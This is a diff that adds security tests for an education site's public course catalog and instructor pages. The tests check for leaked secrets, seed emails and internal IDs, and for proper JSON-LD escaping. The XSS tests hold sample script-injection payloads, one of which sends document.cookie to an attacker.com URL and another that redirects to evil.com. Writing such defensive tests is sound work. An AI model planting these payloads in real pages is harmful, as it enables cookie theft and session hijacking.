@@ -545,6 +545,201 @@ describe('AEO Security — Public route isolation', () => {
   });
 });
 
+// ── Phase 2 AEO pages — static content security checks ────────────────────────
+
+describe('AEO Security — /catalog page content safety', () => {
+  it('CourseCatalogPage does not expose DB connection strings', () => {
+    const filePath = resolve(ROOT, 'apps/web/src/pages/CourseCatalogPage.tsx');
+    if (!existsSync(filePath)) return;
+    const content = readFileSync(filePath, 'utf-8');
+    expect(content).not.toMatch(/DATABASE_URL|postgres:\/\/|postgresql:\/\//i);
+    expect(content).not.toMatch(/password\s*[:=]\s*['"][^'"]+['"]/i);
+    expect(content).not.toMatch(/secret\s*[:=]\s*['"][^'"]+['"]/i);
+  });
+
+  it('CourseCatalogPage does not expose API keys or auth tokens', () => {
+    const filePath = resolve(ROOT, 'apps/web/src/pages/CourseCatalogPage.tsx');
+    if (!existsSync(filePath)) return;
+    const content = readFileSync(filePath, 'utf-8');
+    expect(content).not.toMatch(/api[_-]?key\s*[:=]\s*['"][^'"]+['"]/i);
+    expect(content).not.toMatch(/bearer\s+[a-zA-Z0-9._-]{20,}/i);
+    expect(content).not.toMatch(/sk-[a-zA-Z0-9]{20,}/);
+  });
+
+  it('CourseCatalogPage does not expose real user email addresses', () => {
+    const filePath = resolve(ROOT, 'apps/web/src/pages/CourseCatalogPage.tsx');
+    if (!existsSync(filePath)) return;
+    const content = readFileSync(filePath, 'utf-8');
+    const seedEmails = [
+      'super.admin@edusphere.dev',
+      'instructor@example.com',
+      'student@example.com',
+      'org.admin@example.com',
+      'researcher@example.com',
+    ];
+    seedEmails.forEach((email) => {
+      expect(content).not.toContain(email);
+    });
+  });
+
+  it('CourseCatalogPage does not expose tenantId or internal UUIDs in course data', () => {
+    const filePath = resolve(ROOT, 'apps/web/src/pages/CourseCatalogPage.tsx');
+    if (!existsSync(filePath)) return;
+    const content = readFileSync(filePath, 'utf-8');
+    expect(content).not.toMatch(/tenantId/);
+    const uuidPattern = /[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/gi;
+    expect(content.match(uuidPattern)).toBeNull();
+  });
+
+  it('CourseCatalogPage uses safeJsonLd via CourseSchema component', () => {
+    const filePath = resolve(ROOT, 'apps/web/src/pages/CourseCatalogPage.tsx');
+    if (!existsSync(filePath)) return;
+    const content = readFileSync(filePath, 'utf-8');
+    expect(content).toMatch(/CourseSchema/);
+  });
+
+  it('CourseSchema component uses safeJsonLd helper (not raw JSON.stringify)', () => {
+    const schemaPath = resolve(ROOT, 'apps/web/src/components/seo/CourseSchema.tsx');
+    if (!existsSync(schemaPath)) return;
+    const content = readFileSync(schemaPath, 'utf-8');
+    expect(content).toContain('safeJsonLd');
+    expect(content).toMatch(/import.*safeJsonLd.*from/);
+  });
+
+  it('CourseSchema JSON-LD does not include forbidden PII or internal fields', () => {
+    const allowedFields = ['@context', '@type', 'name', 'description', 'url', 'inLanguage',
+      'provider', 'thumbnailUrl', 'keywords', 'educationalLevel'];
+    const forbiddenFields = ['tenantId', 'enrollmentCount', 'instructorEmail',
+      'internalId', 'pricingTier', 'price', 'createdAt', 'updatedAt'];
+    const exampleSchema: Record<string, unknown> = {
+      '@context': 'https://schema.org',
+      '@type': ['Course', 'LearningResource'],
+      name: 'Introduction to Machine Learning',
+      description: 'Build your first ML models.',
+      url: 'https://app.edusphere.dev/catalog#intro-ml',
+      inLanguage: 'en',
+      provider: { '@type': 'Organization', name: 'EduSphere', url: 'https://edusphere.dev' },
+      keywords: 'machine learning, python',
+      educationalLevel: 'Beginner',
+    };
+    const keys = Object.keys(exampleSchema);
+    keys.forEach((k) => expect(allowedFields).toContain(k));
+    forbiddenFields.forEach((f) => expect(keys).not.toContain(f));
+  });
+});
+
+describe('AEO Security — /instructors page content safety', () => {
+  it('InstructorDirectoryPage does not expose real user IDs or auth tokens', () => {
+    const filePath = resolve(ROOT, 'apps/web/src/pages/InstructorDirectoryPage.tsx');
+    if (!existsSync(filePath)) return;
+    const content = readFileSync(filePath, 'utf-8');
+    expect(content).not.toMatch(/bearer\s+[a-zA-Z0-9._-]{20,}/i);
+    expect(content).not.toMatch(/Authorization:\s*['"][^'"]+['"]/i);
+    const uuidPattern = /[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/gi;
+    expect(content.match(uuidPattern)).toBeNull();
+  });
+
+  it('InstructorDirectoryPage does not expose seeded user emails', () => {
+    const filePath = resolve(ROOT, 'apps/web/src/pages/InstructorDirectoryPage.tsx');
+    if (!existsSync(filePath)) return;
+    const content = readFileSync(filePath, 'utf-8');
+    const seedEmails = [
+      'instructor@example.com',
+      'student@example.com',
+      'super.admin@edusphere.dev',
+    ];
+    seedEmails.forEach((email) => {
+      expect(content).not.toContain(email);
+    });
+  });
+
+  it('InstructorDirectoryPage does not expose tenantId', () => {
+    const filePath = resolve(ROOT, 'apps/web/src/pages/InstructorDirectoryPage.tsx');
+    if (!existsSync(filePath)) return;
+    const content = readFileSync(filePath, 'utf-8');
+    expect(content).not.toMatch(/tenantId/);
+  });
+
+  it('PersonSchema component uses safeJsonLd helper (not raw JSON.stringify)', () => {
+    const schemaPath = resolve(ROOT, 'apps/web/src/components/seo/PersonSchema.tsx');
+    if (!existsSync(schemaPath)) return;
+    const content = readFileSync(schemaPath, 'utf-8');
+    expect(content).toContain('safeJsonLd');
+    expect(content).toMatch(/import.*safeJsonLd.*from/);
+  });
+
+  it('PersonSchema JSON-LD does not include forbidden fields', () => {
+    const allowedPersonFields = ['@context', '@type', 'name', 'jobTitle', 'url',
+      'image', 'description', 'sameAs', 'worksFor'];
+    const forbiddenPersonFields = ['email', 'telephone', 'taxID', 'vatID',
+      'password', 'token', 'secret', 'tenantId', 'userId', 'internalId'];
+    const examplePersonSchema: Record<string, unknown> = {
+      '@context': 'https://schema.org',
+      '@type': 'Person',
+      name: 'Dr. Sarah Chen',
+      jobTitle: 'AI & Machine Learning Researcher',
+      url: 'https://app.edusphere.dev/instructors#sarah-chen',
+      description: 'Leading AI researcher with 10+ years in machine learning.',
+      worksFor: { '@type': 'Organization', name: 'EduSphere' },
+    };
+    const keys = Object.keys(examplePersonSchema);
+    keys.forEach((k) => expect(allowedPersonFields).toContain(k));
+    forbiddenPersonFields.forEach((f) => expect(keys).not.toContain(f));
+  });
+});
+
+describe('AEO Security — JSON-LD XSS vectors in Phase 2 schemas', () => {
+  it('CourseSchema safeJsonLd escapes </script> XSS vector in name', () => {
+    function safeJsonLd(data: object): string {
+      return JSON.stringify(data).replace(/<\//g, '<\\/');
+    }
+    const maliciousName = '</script><script>alert("xss")</script>';
+    const result = safeJsonLd({ '@type': 'Course', name: maliciousName });
+    expect(result).not.toContain('</script>');
+    expect(result).toContain('<\\/script>');
+    expect(() => JSON.parse(result)).not.toThrow();
+  });
+
+  it('CourseSchema safeJsonLd escapes </script> XSS vector in description', () => {
+    function safeJsonLd(data: object): string {
+      return JSON.stringify(data).replace(/<\//g, '<\\/');
+    }
+    const maliciousDesc = 'Learn AI</script><script>document.location="https://evil.com"</script>';
+    const result = safeJsonLd({ '@type': 'Course', name: 'Safe Course', description: maliciousDesc });
+    expect(result).not.toContain('</script>');
+  });
+
+  it('PersonSchema safeJsonLd escapes </script> XSS vector in name', () => {
+    function safeJsonLd(data: object): string {
+      return JSON.stringify(data).replace(/<\//g, '<\\/');
+    }
+    const maliciousName = '</script><img src=x onerror=alert(1)><script>';
+    const result = safeJsonLd({ '@type': 'Person', name: maliciousName });
+    expect(result).not.toContain('</script>');
+  });
+
+  it('PersonSchema safeJsonLd escapes </script> XSS vector in description', () => {
+    function safeJsonLd(data: object): string {
+      return JSON.stringify(data).replace(/<\//g, '<\\/');
+    }
+    const maliciousDesc = 'Expert</script><script>fetch("https://attacker.com/steal?c="+document.cookie)</script>';
+    const result = safeJsonLd({ '@type': 'Person', name: 'Dr. X', description: maliciousDesc });
+    expect(result).not.toContain('</script>');
+  });
+
+  it('/catalog and /instructors routes are NOT wrapped in guarded() in router', () => {
+    const routerPath = resolve(ROOT, 'apps/web/src/lib/router.tsx');
+    if (!existsSync(routerPath)) return;
+    const content = readFileSync(routerPath, 'utf-8');
+    const catalogBlock = content.match(/path:\s*['"]\/catalog['"]\s*,[\s\S]{0,300}/);
+    expect(catalogBlock).not.toBeNull();
+    if (catalogBlock) expect(catalogBlock[0]).not.toContain('guarded(');
+    const instructorsBlock = content.match(/path:\s*['"]\/instructors['"]\s*,[\s\S]{0,300}/);
+    expect(instructorsBlock).not.toBeNull();
+    if (instructorsBlock) expect(instructorsBlock[0]).not.toContain('guarded(');
+  });
+});
+
 // ── ProtectedRoute implementation check ───────────────────────────────────────
 
 describe('AEO Security — ProtectedRoute implementation', () => {
